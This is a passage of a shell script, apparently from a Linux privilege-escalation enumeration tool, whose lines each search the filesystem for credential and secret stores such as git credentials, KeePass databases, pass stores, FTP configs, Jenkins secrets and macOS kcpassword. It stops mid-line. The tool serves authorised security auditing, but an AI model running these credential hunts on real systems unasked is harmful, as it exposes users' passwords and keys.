  1280	  PSTORAGE_ZABBIX=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "zabbix_server\.conf$|zabbix_agentd\.conf$|zabbix$" | sort | uniq | head -n 70)
  1281	  PSTORAGE_GITHUB=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.github$|\.gitconfig$|\.git-credentials$|\.git$" | sort | uniq | head -n 70)
  1282	  PSTORAGE_SVN=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.svn$" | sort | uniq | head -n 70)
  1283	  PSTORAGE_KEEPASS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.kdbx$|KeePass\.config.*$|KeePass\.ini$|KeePass\.enforced.*$" | sort | uniq | head -n 70)
  1284	  PSTORAGE_PRE_SHARED_KEYS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.psk$" | sort | uniq | head -n 70)
  1285	  PSTORAGE_PASS_STORE_DIRECTORIES=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.password-store$" | sort | uniq | head -n 70)
  1286	  PSTORAGE_FTP=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "vsftpd\.conf$|.*\.ftpconfig$|ffftp\.ini$|ftp\.ini$|ftp\.config$|sites\.ini$|wcx_ftp\.ini$|winscp\.ini$|ws_ftp\.ini$" | sort | uniq | head -n 70)
  1287	  PSTORAGE_SAMBA=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "smb\.conf$" | sort | uniq | head -n 70)
  1288	  PSTORAGE_DNS=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}var|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}etc" | grep -E "bind$" | sort | uniq | head -n 70)
  1289	  PSTORAGE_SEEDDMS=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "seeddms.*$" | sort | uniq | head -n 70)
  1290	  PSTORAGE_DDCLIENT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ddclient\.conf$" | sort | uniq | head -n 70)
  1291	  PSTORAGE_KCPASSWORD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "kcpassword$" | sort | uniq | head -n 70)
  1292	  PSTORAGE_SENTRY=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sentry$|sentry\.conf\.py$" | sort | uniq | head -n 70)
  1293	  PSTORAGE_STRAPI=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "environments$" | sort | uniq | head -n 70)
  1294	  PSTORAGE_CACTI=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "cacti$" | sort | uniq | head -n 70)
  1295	  PSTORAGE_ROUNDCUBE=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "roundcube$" | sort | uniq | head -n 70)
  1296	  PSTORAGE_PASSBOLT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "passbolt\.php$" | sort | uniq | head -n 70)
  1297	  PSTORAGE_JETTY=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "jetty-realm\.properties$" | sort | uniq | head -n 70)
  1298	  PSTORAGE_JENKINS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "master\.key$|hudson\.util\.Secret$|credentials\.xml$|config\.xml$|.*jenkins$" | sort | uniq | head -n 70)
  1299	  PSTORAGE_WGET=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.wgetrc$" | sort | uniq | head -n 70)
  1300	  PSTORAGE_INTERESTING_LOGS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "access\.log$|error\.log$" | sort | uniq | head -n 70)
  1301	  PSTORAGE_OTHER_INTERESTING=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E 